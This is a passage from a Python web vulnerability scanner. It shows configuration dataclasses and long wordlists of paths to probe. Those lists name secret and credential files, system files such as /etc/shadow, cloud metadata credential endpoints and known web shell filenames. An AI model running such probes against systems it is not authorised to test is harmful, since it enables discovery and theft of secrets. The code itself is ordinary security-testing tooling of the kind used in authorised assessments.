import asyncio
import aiohttp
import aiodns
import socket
import ssl
import json
import re
import random
import string
import ipaddress
import urllib.parse
import hashlib
import time
import base64
import mimetypes
import concurrent.futures
import os
import secrets
import uuid
import xml.etree.ElementTree as ET
import html
import zlib
import gzip
import brotli
import subprocess
import tempfile
import struct
import psutil
import dns.resolver
import OpenSSL.crypto
import cryptography
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import backoff
import aiofiles
import yaml
import csv
import xml.dom.minidom
import math
import statistics
from concurrent.futures import ThreadPoolExecutor

from datetime import datetime, timedelta
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, field, asdict
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs
from html import escape
from collections import defaultdict, Counter, deque

@dataclass
class Vulnerability:
    title: str
    severity: str
    description: str
    proof: str
    endpoint: str
    technical_detail: str
    remediation: str
    cvss_score: float
    category: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class ScanResult:
    target: str
    start_time: str
    end_time: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    information: Dict[str, Any] = field(default_factory=dict)
    score: int = 0
    risk_level: str = ""


@dataclass
class ScanConfig:
    enable_business_logic: bool = True
    enable_api_fuzzing: bool = True
    enable_websocket: bool = True
    enable_mobile: bool = True
    enable_cloud: bool = True
    enable_container: bool = True
    enable_cms: bool = True
    enable_protocol: bool = True
    enable_javascript: bool = True
    enable_infrastructure: bool = True
    enable_compliance: bool = True
    enable_advanced: bool = True
    enable_modern: bool = True
    
    auth_username: Optional[str] = None
    auth_password: Optional[str] = None
    auth_token: Optional[str] = None
    auth_cookie: Optional[str] = None
    auth_jwt: Optional[str] = None
    auth_flow: str = "default"
    
    user_roles: List[str] = field(default_factory=lambda: ["admin", "user", "guest"])
    business_workflows: Dict[str, Any] = field(default_factory=dict)
    
    api_schema: Optional[str] = None
    api_version: str = "v1"
    
    proxy_url: Optional[str] = None
    proxy_auth: Optional[Tuple[str, str]] = None
    
    max_requests_per_second: int = 10
    respect_robots_txt: bool = True
    
    compliance_standards: List[str] = field(default_factory=lambda: ["GDPR", "PCI_DSS", "HIPAA"])
    
    report_language: str = "en"
    report_format: List[str] = field(default_factory=lambda: ["html", "json", "pdf"])
    
    enable_machine_learning: bool = False
    enable_threat_intelligence: bool = False
    enable_distributed_scanning: bool = False
    
    legal_consent: bool = False
    scope_boundary: str = ""
    max_duration: int = 3600


@dataclass
class BusinessLogicTest:
    test_id: str
    name: str
    description: str
    category: str
    severity: str
    steps: List[Dict[str, Any]]
    validation_rules: List[Dict[str, Any]]
    expected_result: str


@dataclass
class APITest:
    endpoint: str
    method: str
    parameters: Dict[str, Any]
    authentication: Dict[str, Any]
    schema: Optional[Dict[str, Any]]
    fuzzing_payloads: List[Any]


@dataclass
class ThreatIntelligence:
    iocs: List[Dict[str, Any]]
    reputation_data: Dict[str, Any]
    historical_attacks: List[Dict[str, Any]]
    cvss_scores: Dict[str, float]


@dataclass
class ComplianceCheck:
    standard: str
    requirement: str
    test_procedure: str
    result: str
    evidence: str
    recommendation: str


@dataclass
class MachineLearningModel:
    model_name: str
    model_type: str
    features: List[str]
    predictions: Dict[str, float]
    confidence: float


class SXWebScanner:
    
    def __init__(self, 
                 target_url: str,
                 scan_config: ScanConfig = None,
                 max_concurrency: int = 50,
                 timeout: int = 30,
                 user_agent: str = None,
                 cookies: Dict[str, str] = None,
                 headers: Dict[str, str] = None,
                 follow_redirects: bool = True,
                 verify_ssl: bool = False,
                 depth: int = 3):

        if not target_url:
            raise ValueError("Target URL cannot be empty")
        
        target_url = target_url.strip()
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        self.target_url = target_url.rstrip('/')
        
        try:
            parsed = urlparse(self.target_url)
            self.base_domain = parsed.netloc
            self.scheme = parsed.scheme
            
            if not self.base_domain:
                raise ValueError(f"Invalid URL: {target_url}. Could not extract domain.")
            
            if ':' in self.base_domain:
                self.base_domain = self.base_domain.split(':')[0]
            
            print(f"[DEBUG] Parsed URL: scheme={self.scheme}, domain={self.base_domain}")
            
        except Exception as e:
            raise ValueError(f"Failed to parse URL {target_url}: {str(e)}")

        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.scheme = urlparse(target_url).scheme
        self.max_concurrency = max_concurrency
        self.timeout = timeout
        self.follow_redirects = follow_redirects
        self.verify_ssl = verify_ssl
        self.scan_depth = depth
        
        self.scan_config = scan_config or ScanConfig()
        
        self.session = None
        self.cookies = cookies or {}
        self.headers = headers or {}
        self.user_agent = user_agent or "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1)"
        
        self.results = ScanResult(
            target=target_url,
            start_time=datetime.now().isoformat(),
            end_time=""
        )
        self.vulnerabilities = []
        self.discovered_urls = set()
        self.discovered_subdomains = set()
        self.discovered_files = set()
        self.discovered_ports = set()
        self.discovered_apis = set()
        self.fingerprints = {}
        
        self.business_logic_tests: List[BusinessLogicTest] = []
        self.api_tests: List[APITest] = []
        self.threat_intel = ThreatIntelligence([], {}, [], {})
        self.compliance_checks: List[ComplianceCheck] = []
        self.ml_models: Dict[str, MachineLearningModel] = {}
        
        self.scan_complete = False
        self.scan_progress = {}
        self.rate_limit_detected = False
        self.waf_detected = None
        
        self.payloads_dir = "Payloads"
        self.logs_dir = "logs"
        self.sessions_dir = "sessions"
        self.reports_dir = "reports"
        self.evidence_dir = "evidence"
        
        for directory in [self.payloads_dir, self.logs_dir, self.sessions_dir, 
                         self.reports_dir, self.evidence_dir]:
            os.makedirs(directory, exist_ok=True)
        
        self._init_payloads()
        self._save_missing_payloads()
        self._load_combined_payloads()
        self._enhance_payloads()
        
        self.cookie_jar = aiohttp.CookieJar()
        self.rate_limit_detector = self.RateLimitDetector()
        self.error_handler = self.EnhancedErrorHandler()
        self.logger = self.EnhancedLogger()
        
        if self.scan_config.enable_machine_learning:
            self._load_ml_models()
        
        if self.scan_config.enable_threat_intelligence:
            self._load_threat_intelligence()

    def _init_payloads(self):
        self.common_dirs = [
            "admin", "administrator", "wp-admin", "wp-login.php", "login",
            "dashboard", "control", "manage", "backend", "adminpanel", 
            "admincp", "admincp.php", "admincenter", "admin_area", 
            "admin-login", "admin_login", "admin1", "admin2", "admin3",
            "admin4", "admin5", "sysadmin", "system", "root", "superuser",
            "useradmin", "usermanager", "panel", "controlpanel", "cpanel",
            "webadmin", "admin-web", "webmaster", "operator", "moderator",
            "wp-admin", "wp-login", "wp-content", "wp-includes", "wordpress",
            "joomla/administrator", "administrator/index.php", "administrator/components",
            "administrator/templates", "administrator/modules", "administrator/plugins",
            "drupal/user/login", "drupal/admin", "user/login", "user/register",
            "magento/admin", "adminhtml", "opencart/admin", "prestashop/admin",
            "craft/admin", "concrete5/index.php/login", "concrete5/index.php/dashboard",
            "api", "api/v1", "api/v2", "api/v3", "api/v4", "api/v5",
            "api/v1.0", "api/v2.0", "api/v3.0", "api/v1.1", "api/v1.2",
            "rest", "rest/v1", "rest/v2", "rest/api", "rest/api/v1",
            "graphql", "graphql/v1", "graphql/console", "graphiql", "playground",
            "swagger", "swagger-ui", "swagger-ui.html", "swagger/index.html",
            "swagger/docs", "swagger/v1", "swagger/v2", "openapi", "openapi.json",
            "docs", "docs/api", "docs/v1", "documentation", "api-docs",
            "api/console", "api/explorer", "api/playground", "api/graphiql",
            "login", "signin", "sign-in", "log-in", "auth", "authentication",
            "authenticate", "signup", "register", "registration", "create-account",
            "oauth", "oauth2", "oauth/authorize", "oauth/token", "oauth/callback",
            "sso", "sso/login", "single-sign-on", "openid", "openid-connect",
            "saml", "saml2", "saml/login", "cas", "cas/login", "logout",
            "signout", "log-out", "exit", "bye", "goodbye",
            "user", "users", "user/profile", "user/account", "user/settings",
            "user/preferences", "user/edit", "user/update", "user/delete",
            "profile", "profiles", "myaccount", "my-account", "account",
            "accounts", "settings", "preferences", "configuration", "config",
            "edit-profile", "edit-account", "update-profile", "update-account",
            "test", "testing", "test1", "test2", "test3", "test-page",
            "test-site", "staging", "staging-site", "stage", "preprod",
            "pre-production", "dev", "development", "develop", "developer",
            "devsite", "dev-site", "dev-environment", "sandbox", "sandbox-site",
            "demo", "demo-site", "demo1", "demo2", "demo3", "demo-page",
            "beta", "beta-site", "beta-test", "alpha", "alpha-site",
            "uat", "uat-site", "uat-environment", "qa", "qa-site",
            "backup", "backups", "backup.sql", "backup.zip", "backup.tar",
            "backup.tar.gz", "backup.7z", "backup.rar", "backup.bak",
            "backup.old", "backup.tmp", "backup-latest", "backup-2023",
            "backup-2024", "database-backup", "db-backup", "sql-backup",
            "www-backup", "site-backup", "full-backup", "incremental-backup",
            "archive", "archives", "old", "old-site", "old-version",
            "previous", "previous-version", "legacy", "legacy-site",
            

            "config", "configuration", "configs", "configurations",
            "config.php", "config.json", "config.yaml", "config.yml",
            "config.xml", "config.ini", "config.local", "config.production",
            "config.development", "config.staging", "config.test",
            "settings.php", "settings.json", "settings.yaml", "settings.yml",
            "app.config", "application.config", "web.config", "server.config",
            

            ".env", ".env.local", ".env.production", ".env.development",
            ".env.test", ".env.staging", ".env.example", ".env.sample",
            "env", "environment", "environment.php", "environment.json",
            "secrets", "secrets.json", "secrets.yaml", "secrets.yml",
            "credentials", "credentials.json", "credentials.yaml",
            "keys", "keys.json", "keys.yaml", "api-keys", "api_keys.json",
            "private-keys", "private_keys.json", "ssh-keys", "ssh_keys",
            

            ".git", ".git/", ".git/config", ".git/HEAD", ".git/logs",
            ".git/index", ".git/description", ".git/hooks", ".git/objects",
            ".git/refs", ".git/info", ".git/info/exclude", ".git/info/refs",
            ".svn", ".svn/", ".svn/entries", ".svn/wc.db", ".svn/format",
            ".hg", ".hg/", ".hg/store", ".hg/00changelog.i", ".hg/dirstate",
            ".bzr", ".bzr/", ".bzr/branch", ".bzr/checkout", ".bzr/repository",
            "CVS", "CVS/", "CVS/Root", "CVS/Entries", "CVS/Repository",
            

            "upload", "uploads", "upload-file", "upload-image", "upload-document",
            "upload-video", "upload-audio", "file-upload", "file-uploads",
            "image-upload", "document-upload", "media-upload", "attachment",
            "attachments", "files", "files/upload", "files/uploads",
            "assets/upload", "assets/uploads", "content/upload", "content/uploads",
            

            "database", "databases", "db", "dbs", "data", "data/db",
            "data/database", "sql", "mysql", "postgres", "mongodb",
            "redis", "elasticsearch", "couchdb", "cassandra", "oracle",
            "mssql", "sqlite", "dbadmin", "db-admin", "phpmyadmin",
            "adminer", "adminer.php", "phpMyAdmin", "mysql/admin",
            "db/phpmyadmin", "pma", "myadmin", "dbmanager",
            

            "logs", "log", "logging", "error.log", "error_log",
            "access.log", "access_log", "debug.log", "debug_log",
            "application.log", "app.log", "system.log", "syslog",
            "security.log", "auth.log", "apache.log", "nginx.log",
            "iis.log", "web.log", "site.log", "server.log",
            

            "tmp", "temp", "temporary", "cache", "caches", "caching",
            "tempfiles", "tmpfiles", "temporary-files", "temp-files",
            "session", "sessions", "session-data", "cookie", "cookies",
            

            "search", "search-results", "find", "finder", "lookup",
            "query", "queries", "index", "indexes", "indices",
            "sitemap", "sitemap.xml", "sitemap.xml.gz", "sitemap.txt",
            "sitemap.html", "sitemap_index.xml", "sitemap-index.xml",
            

            "robots.txt", "robots", "security.txt", ".well-known/security.txt",
            "humans.txt", "ads.txt", ".well-known/ads.txt",
            "crossdomain.xml", "clientaccesspolicy.xml", "favicon.ico",
            

            "hidden", "secret", "secrets", "private", "priv",
            "internal", "confidential", "restricted", "secure",
            "protected", "auth-required", "members-only", "staff",
            "employee", "staff-only", "employees", "team", "teams",
            

            "wp-content/plugins", "wp-content/themes", "wp-content/uploads",
            "wp-content/upgrade", "wp-content/backup", "wp-content/backups",
            "wp-includes/js", "wp-includes/css", "wp-includes/images",
            "wp-json", "wp-json/wp/v2", "xmlrpc.php", "xmlrpc",
            

            "laravel/public/index.php", "laravel/storage", "laravel/bootstrap",
            "symfony/web/app.php", "symfony/web/app_dev.php", "symfony/web/config",
            "django/admin", "django/static", "django/media", "flask/static",
            "rails/public", "rails/assets", "spring-boot/actuator",
            "spring-boot/health", "spring-boot/info", "spring-boot/metrics",
            

            "api/test", "api/debug", "api/health", "api/status", "api/ping",
            "api/version", "api/info", "api/metrics", "api/stats", "api/monitor",
            

            "webservices", "web-services", "ws", "wsdl", "wsdl.xml",
            "soap", "soap/api", "rpc", "xml-rpc", "json-rpc",
            

            ".php", ".asp", ".aspx", ".jsp", ".jspx", ".do", ".action",
            ".html", ".htm", ".xhtml", ".shtml", ".phtml",
            ".xml", ".json", ".yaml", ".yml", ".ini", ".conf",
            

            "index.php", "index.html", "index.htm", "default.aspx",
            "default.asp", "default.jsp", "home.aspx", "home.asp",
            

            "wp-config.php", "wp-config.php.bak", "wp-config.php.save",
            "wp-config.php.old", "wp-config.php.backup", "wp-config.php.tmp",
            "wp-settings.php", "wp-load.php", "wp-signup.php", "wp-trackback.php",
            "wp-comments-post.php", "wp-cron.php", "wp-mail.php",
            

            "sites/default/settings.php", "sites/default/default.settings.php",
            "sites/default/services.yml", "sites/default/settings.local.php",
            

            "configuration.php", "configuration.php.bak", "configuration.php.old",
            "htaccess.txt", "web.config.txt", "robots.txt.dist",
            

            ".bak", ".backup", ".old", ".save", ".sav", ".tmp", ".temp",
            ".copy", ".orig", ".original", ".previous", ".prev",
            

            ".zip", ".tar", ".tar.gz", ".tgz", ".gz", ".7z", ".rar",
            ".bz2", ".xz", ".lzma", ".z", ".Z",
            

            ".sql", ".sql.gz", ".sql.zip", ".sql.bak", ".sql.backup",
            ".dump", ".dump.gz", ".dump.zip", ".export", ".export.gz",
            

            ".log", ".log.gz", ".log.zip", ".log.bak", ".log.old",
            ".err", ".error", ".out", ".stdout", ".stderr",
            

            ".cfg", ".conf", ".config", ".properties", ".prop",
            ".settings", ".prefs", ".ini", ".inf", ".rc",
            

            ".pem", ".crt", ".cert", ".key", ".pfx", ".p12",
            ".csr", ".der", ".cer", ".jks", ".keystore",
            

            ".java", ".py", ".js", ".ts", ".cpp", ".c", ".h",
            ".cs", ".go", ".rs", ".rb", ".php", ".pl", ".sh",
            

            "README", "README.md", "README.txt", "README.rst",
            "CHANGELOG", "CHANGELOG.md", "CHANGELOG.txt",
            "LICENSE", "LICENSE.txt", "LICENSE.md", "AUTHORS",
            

            "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
            "package.json", "package-lock.json", "yarn.lock",
            "composer.json", "composer.lock", "pom.xml", "build.gradle",
            "build.sbt", "Cargo.toml", "go.mod", "requirements.txt",
            

            ".github", ".github/workflows", ".gitlab-ci.yml",
            ".travis.yml", "Jenkinsfile", "azure-pipelines.yml",
            "bitbucket-pipelines.yml", "circleci/config.yml",
            

            "phpunit.xml", "jest.config.js", "karma.conf.js",
            "pytest.ini", "tox.ini", ".coveragerc",
            

            ".vscode", ".idea", ".project", ".classpath",
            ".settings", ".metadata", "Thumbs.db", ".DS_Store",
            

            "android", "ios", "mobile", "m", "mobile-app",
            "android-app", "ios-app", "app", "application",
            

            "payment", "payments", "checkout", "cart", "shopping-cart",
            "billing", "invoice", "invoices", "order", "orders",
            "subscription", "subscriptions", "pricing", "plans",
            

            "forum", "forums", "community", "communities",
            "discussion", "discussions", "chat", "chats",
            "message", "messages", "inbox", "outbox",
            

            "help", "helps", "support", "faq", "faqs",
            "contact", "contacts", "contact-us", "contactus",
            "about", "about-us", "aboutus", "company",
            

            "terms", "terms-of-service", "tos", "terms-and-conditions",
            "privacy", "privacy-policy", "cookie-policy", "disclaimer",
            "legal", "legals", "imprint", "impressum",
            

            "media", "medias", "images", "image", "img", "imgs",
            "photos", "photo", "picture", "pictures", "gallery",
            "galleries", "video", "videos", "audio", "audios",
            "music", "musics", "document", "documents", "doc",
            

            "static", "statics", "assets", "asset", "resource",
            "resources", "public", "publics", "shared", "share",
            "common", "commons", "global", "globals",
            

            "etc/passwd", "etc/shadow", "etc/hosts", "etc/hostname",
            "etc/resolv.conf", "etc/fstab", "etc/motd", "etc/issue",
            "proc/self/environ", "proc/version", "proc/cmdline",
            "var/log", "var/log/messages", "var/log/syslog",
            "var/log/auth.log", "var/log/secure", "var/log/apache2",
            "var/log/nginx", "var/www", "var/www/html",
            

            "windows/win.ini", "windows/system.ini", "boot.ini",
            "autoexec.bat", "config.sys", "Program Files",
            "Program Files (x86)", "Windows/System32",
            "Windows/System32/config", "Windows/System32/drivers/etc/hosts",
            

            "latest/meta-data/", "latest/user-data/",
            "latest/meta-data/iam/security-credentials/",
            "computeMetadata/v1/", "instance/service-accounts/",
            

            "phpinfo.php", "info.php", "test.php", "debug.php",
            "console.php", "shell.php", "cmd.php", "backdoor.php",
            "c99.php", "r57.php", "wso.php", "b374k.php"
        ]
        
        self.common_files = [

            ".env", ".env.local", ".env.production", ".env.development",
            ".env.test", ".env.staging", ".env.example", ".env.sample",
            ".env.prod", ".env.dev", ".env.uat", ".env.qa",
            "env", "env.php", "env.json", "env.yaml", "env.yml",
            "environment", "environment.php", "environment.json",
            "environment.yaml", "environment.yml", "environment.prod",
            "environment.dev", "environment.test", "environment.staging",
            

            "config.php", "config.json", "config.yaml", "config.yml",
            "config.xml", "config.ini", "config.local.php", "config.prod.php",
            "config.dev.php", "config.test.php", "config.staging.php",
            "configuration.php", "configuration.json", "configuration.yaml",
            "configuration.yml", "configuration.xml", "configuration.ini",
            "settings.php", "settings.json", "settings.yaml", "settings.yml",
            "settings.xml", "settings.ini", "app.config", "app.config.php",
            "app.config.json", "app.config.yaml", "app.config.yml",
            "application.config", "application.config.php", "application.config.json",
            "application.config.yaml", "application.config.yml",
            

            "web.config", "web.xml", "server.xml", "context.xml",
            "struts.xml", "spring.xml", "hibernate.cfg.xml",
            "persistence.xml", "beans.xml", "faces-config.xml",
            "applicationContext.xml", "dispatcher-servlet.xml",
            

            "secrets.json", "secrets.yaml", "secrets.yml", "secrets.xml",
            "secrets.php", "secrets.env", "credentials.json", "credentials.yaml",
            "credentials.yml", "credentials.xml", "credentials.php",
            "credentials.env", "keys.json", "keys.yaml", "keys.yml",
            "keys.xml", "keys.php", "api-keys.json", "api_keys.json",
            "api-keys.yaml", "api_keys.yaml", "api-keys.php", "api_keys.php",
            "private-keys.json", "private_keys.json", "ssh-keys.json",
            "ssh_keys.json", "oauth-keys.json", "oauth_keys.json",
            

            "database.php", "database.json", "database.yaml", "database.yml",
            "database.xml", "database.ini", "db.config", "db.config.php",
            "db.config.json", "db.config.yaml", "db.config.yml",
            "datasource.php", "datasource.json", "datasource.yaml",
            "datasource.yml", "jdbc.properties", "jdbc.xml",
            

            "backup.sql", "backup.sql.gz", "backup.sql.zip", "backup.sql.bak",
            "backup.sql.old", "backup.sql.prev", "backup.sql.previous",
            "database.sql", "database.sql.gz", "database.sql.zip",
            "database.sql.bak", "database.sql.old", "db.sql", "db.sql.gz",
            "db.sql.zip", "db.sql.bak", "db.sql.old", "dump.sql", "dump.sql.gz",
            "dump.sql.zip", "export.sql", "export.sql.gz", "export.sql.zip",
            "full-backup.sql", "incremental-backup.sql", "daily-backup.sql",
            "weekly-backup.sql", "monthly-backup.sql", "yearly-backup.sql",
            

            "backup.zip", "backup.tar", "backup.tar.gz", "backup.tgz",
            "backup.7z", "backup.rar", "backup.bz2", "backup.xz",
            "site-backup.zip", "site-backup.tar.gz", "www-backup.zip",
            "www-backup.tar.gz", "full-backup.zip", "full-backup.tar.gz",
            "database-backup.zip", "database-backup.tar.gz",
            "files-backup.zip", "files-backup.tar.gz",
            

            "backup.bak", "backup.old", "backup.tmp", "backup.temp",
            "backup.copy", "backup.orig", "backup.original",
            "backup.previous", "backup.prev", "backup.save", "backup.sav",
            

            ".git/config", ".git/HEAD", ".git/logs/HEAD", ".git/index",
            ".git/description", ".git/info/exclude", ".git/info/refs",
            ".svn/entries", ".svn/wc.db", ".svn/format", ".svn/dir-prop-base",
            ".hg/00changelog.i", ".hg/dirstate", ".hg/last-message.txt",
            ".hg/branch", ".hg/branch.cache", ".hg/cache/tags",
            ".bzr/branch/branch.conf", ".bzr/checkout/views",
            "CVS/Root", "CVS/Entries", "CVS/Repository", "CVS/Tag",
            

            "error.log", "error_log", "error.log.1", "error.log.2",
            "error.log.3", "error.log.4", "error.log.5", "error.log.6",
            "error.log.7", "error.log.8", "error.log.9", "error.log.10",
            "access.log", "access_log", "access.log.1", "access.log.2",
            "access.log.3", "access.log.4", "access.log.5", "access.log.6",
            "access.log.7", "access.log.8", "access.log.9", "access.log.10",
            "debug.log", "debug_log", "debug.log.1", "debug.log.2",
            "debug.log.3", "debug.log.4", "debug.log.5", "debug.log.6",
            "application.log", "app.log", "system.log", "syslog",
            "security.log", "auth.log", "auth.log.1", "auth.log.2",
            "apache.log", "apache2.log", "nginx.log", "iis.log",
            "web.log", "site.log", "server.log", "catalina.out",
            

            "error.log.gz", "error.log.zip", "error.log.tar.gz",
            "access.log.gz", "access.log.zip", "access.log.tar.gz",
            "debug.log.gz", "debug.log.zip", "debug.log.tar.gz",
            "application.log.gz", "app.log.gz", "system.log.gz",
            

            "phpinfo.php", "info.php", "test.php", "debug.php",
            "console.php", "phpinfo", "info", "test", "debug",
            "php-info.php", "php_info.php", "phpinfo.html", "info.html",
            "xdebug.php", "xdebug_info.php", "opcache.php", "opcache_status.php",
            "apc.php", "apc_info.php", "memcache.php", "memcache_info.php",
            "memcached.php", "memcached_info.php", "redis.php", "redis_info.php",
            

            "adminer.php", "adminer-4.8.1.php", "adminer-4.7.9.php",
            "phpmyadmin.php", "phpMyAdmin.php", "pma.php", "myadmin.php",
            "dbadmin.php", "mysql-admin.php", "sql-admin.php",
            "database-admin.php", "db-admin.php", "webadmin.php",
            "web-admin.php", "siteadmin.php", "site-admin.php",
            

            "shell.php", "cmd.php", "backdoor.php", "c99.php", "r57.php",
            "wso.php", "wso2.php", "b374k.php", "c100.php", "r99.php",
            "killer.php", "mini.php", "small.php", "tiny.php",
            "uploader.php", "filemanager.php", "fm.php", "exploit.php",
            "hack.php", "hacker.php", "attack.php", "malware.php",
            "virus.php", "trojan.php", "backdoor.jsp", "cmd.jsp",
            "shell.jsp", "backdoor.aspx", "cmd.aspx", "shell.aspx",
            "backdoor.asp", "cmd.asp", "shell.asp",
            

            "shell.php5", "shell.php7", "shell.phtml", "shell.phps",
            "shell.inc", "shell.txt.php", "shell.jpg.php", "shell.png.php",
            "shell.gif.php", "shell.pdf.php", "shell.doc.php",
            "wso.php5", "wso.php7", "wso.phtml", "wso.phps",
            "c99.php5", "c99.php7", "c99.phtml", "c99.phps",
            

            "wp-config.php", "wp-config.php.bak", "wp-config.php.save",
            "wp-config.php.old", "wp-config.php.backup", "wp-config.php.tmp",
            "wp-config.php.copy", "wp-config.php.orig", "wp-config.php.original",
            "wp-config-sample.php", "wp-config-local.php", "wp-config-dev.php",
            "wp-config-prod.php", "wp-config-staging.php", "wp-config-test.php",
            
            "configuration.php", "configuration.php.bak", "configuration.php.save",
            "configuration.php.old", "configuration.php.backup",
            "configuration.php.tmp", "configuration.php.copy",
            
            "settings.php", "settings.php.bak", "settings.php.save",
            "settings.php.old", "settings.php.backup", "settings.php.tmp",
            

            ".htaccess", ".htaccess.bak", ".htaccess.old", ".htaccess.backup",
            ".htpasswd", ".htpasswd.bak", ".htpasswd.old", ".htpasswd.backup",
            "web.config", "web.config.bak", "web.config.old", "web.config.backup",
            "robots.txt", "robots.txt.bak", "robots.txt.old", "robots.txt.backup",
            

            ".pem", ".crt", ".cert", ".key", ".pfx", ".p12", ".csr",
            ".der", ".cer", ".jks", ".keystore", ".truststore",
            "server.crt", "server.key", "client.crt", "client.key",
            "ca.crt", "ca.key", "root.crt", "root.key",
            "ssl.crt", "ssl.key", "tls.crt", "tls.key",
            "certificate.pem", "private.key", "public.key",
            

            "source.zip", "source.tar.gz", "src.zip", "src.tar.gz",
            "code.zip", "code.tar.gz", "project.zip", "project.tar.gz",
            "app.zip", "app.tar.gz", "website.zip", "website.tar.gz",
            "backend.zip", "backend.tar.gz", "frontend.zip", "frontend.tar.gz",
            

            "README", "README.md", "README.txt", "README.rst", "README.html",
            "README.pdf", "README.docx", "CHANGELOG", "CHANGELOG.md",
            "CHANGELOG.txt", "CHANGELOG.rst", "CHANGELOG.html",
            "LICENSE", "LICENSE.md", "LICENSE.txt", "LICENSE.rst",
            "LICENSE.html", "AUTHORS", "CONTRIBUTORS", "CONTRIBUTING.md",
            

            "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
            "docker-compose.override.yml", "docker-compose.prod.yml",
            "docker-compose.dev.yml", "docker-compose.test.yml",
            "package.json", "package-lock.json", "yarn.lock", "npm-shrinkwrap.json",
            "composer.json", "composer.lock", "pom.xml", "build.gradle",
            "build.sbt", "Cargo.toml", "Cargo.lock", "go.mod", "go.sum",
            "requirements.txt", "Pipfile", "Pipfile.lock", "Gemfile", "Gemfile.lock",
            

            ".github/workflows/main.yml", ".github/workflows/ci.yml",
            ".github/workflows/cd.yml", ".github/workflows/deploy.yml",
            ".gitlab-ci.yml", ".travis.yml", "Jenkinsfile",
            "azure-pipelines.yml", "bitbucket-pipelines.yml",
            "circleci/config.yml", ".drone.yml", "buddy.yml",
            

            "phpunit.xml", "phpunit.xml.dist", "jest.config.js",
            "jest.config.ts", "karma.conf.js", "karma.conf.ts",
            "pytest.ini", "tox.ini", ".coveragerc", ".nycrc",
            "mocha.opts", "cypress.json", "cypress.env.json",
            

            ".vscode/settings.json", ".vscode/launch.json", ".vscode/tasks.json",
            ".idea/workspace.xml", ".idea/project.iml", ".project",
            ".classpath", ".settings/org.eclipse.core.resources.prefs",
            ".metadata/.plugins/org.eclipse.core.resources/.root/.indexes",
            "Thumbs.db", ".DS_Store", "desktop.ini",
            

            "database.db", "data.db", "app.db", "site.db", "users.db",
            "products.db", "orders.db", "customers.db", "inventory.db",
            "test.db", "dev.db", "staging.db", "production.db",
            

            ".sqlite", ".sqlite3", ".db", ".db3", ".sdb", ".s3db",
            "database.sqlite", "database.sqlite3", "data.sqlite",
            "app.sqlite", "site.sqlite", "users.sqlite",
            

            "sess_", "session_", "PHPSESSID", "JSESSIONID",
            "ASP.NET_SessionId", "cfid", "cftoken", "sessionid",
            

            "cache.db", "cache.sqlite", "cache.redis", "cache.memcached",
            "opcache", "apc_cache", "memcache_cache", "redis_cache",
            

            "temp.db", "tmp.db", "temporary.db", "temp.sqlite",
            "tmp.sqlite", "temporary.sqlite", "temp.log", "tmp.log",
            

            "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hosts",
            "/etc/hostname", "/etc/resolv.conf", "/etc/fstab",
            "/etc/motd", "/etc/issue", "/etc/os-release",
            "/proc/self/environ", "/proc/version", "/proc/cmdline",
            "/proc/mounts", "/proc/net/tcp", "/proc/net/udp",
            "/var/log/messages", "/var/log/syslog", "/var/log/auth.log",
            "/var/log/secure", "/var/log/apache2/access.log",
            "/var/log/nginx/access.log", "/var/www/html/index.php",
            

            "/windows/win.ini", "/windows/system.ini", "/boot.ini",
            "/autoexec.bat", "/config.sys", "/Program Files/",
            "/Program Files (x86)/", "/Windows/System32/",
            "/Windows/System32/config/", "/Windows/System32/drivers/etc/hosts",
            

            "/latest/meta-data/", "/latest/user-data/",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/iam/security-credentials/admin",
            "/computeMetadata/v1/", "/computeMetadata/v1/instance/",
            "/metadata/v1/", "/metadata/v1/instance/",
            

            "swagger.json", "swagger.yaml", "swagger.yml",
            "openapi.json", "openapi.yaml", "openapi.yml",
            "api.json", "api.yaml", "api.yml", "docs.json",
            "documentation.json", "spec.json", "spec.yaml",
            

            "sitemap.xml", "sitemap.xml.gz", "sitemap.txt",
            "sitemap.html", "sitemap_index.xml", "sitemap-index.xml",
            "sitemap-news.xml", "sitemap-images.xml", "sitemap-videos.xml",
            

            "security.txt", ".well-known/security.txt", "humans.txt",
            "ads.txt", ".well-known/ads.txt", "crossdomain.xml",
            "clientaccesspolicy.xml", "favicon.ico", "apple-touch-icon.png",
            

            "mobile-config.xml", "mobile-config.json", "app-config.xml",
            "app-config.json", "config.xml", "config.json",
            

            "payment-config.xml", "payment-config.json", "stripe-config.json",
            "paypal-config.json", "braintree-config.json",
            

            "email-config.xml", "email-config.json", "smtp-config.json",
            "mail-config.json", "sendgrid-config.json",
            

            "social-config.xml", "social-config.json", "facebook-config.json",
            "twitter-config.json", "google-config.json",
            

            "analytics-config.xml", "analytics-config.json",
            "google-analytics-config.json", "matomo-config.json",
            

            "cdn-config.xml", "cdn-config.json", "cloudfront-config.json",
            "cloudflare-config.json", "akamai-config.json",
            

            "monitoring-config.xml", "monitoring-config.json",
            "newrelic-config.json", "datadog-config.json",
            

            "backup.sh", "backup.py", "backup.php", "backup.js",
            "database-backup.sh", "files-backup.sh", "full-backup.sh",
            "incremental-backup.sh", "daily-backup.sh", "weekly-backup.sh",
            

            "deploy.sh", "deploy.py", "deploy.php", "deploy.js",
            "setup.sh", "install.sh", "configure.sh", "build.sh",
            

            "maintenance.sh", "maintenance.py", "maintenance.php",
            "cleanup.sh", "cleanup.py", "cleanup.php",
            

            "custom-config.php", "custom-config.json", "custom-config.yaml",
            "local-config.php", "local-config.json", "local-config.yaml",
            "dev-config.php", "dev-config.json", "dev-config.yaml",
            "prod-config.php", "prod-config.json", "prod-config.yaml",
            

            "legacy-config.php", "legacy-config.json", "legacy-config.xml",
            "old-config.php", "old-config.json", "old-config.xml",
            "previous-config.php", "previous-config.json", "previous-config.xml",
            

            "test-config.php", "test-config.json", "test-config.yaml",
            "testing-config.php", "testing-config.json", "testing-config.yaml",
            "qa-config.php", "qa-config.json", "qa-config.yaml",
            

            "staging-config.php", "staging-config.json", "staging-config.yaml",
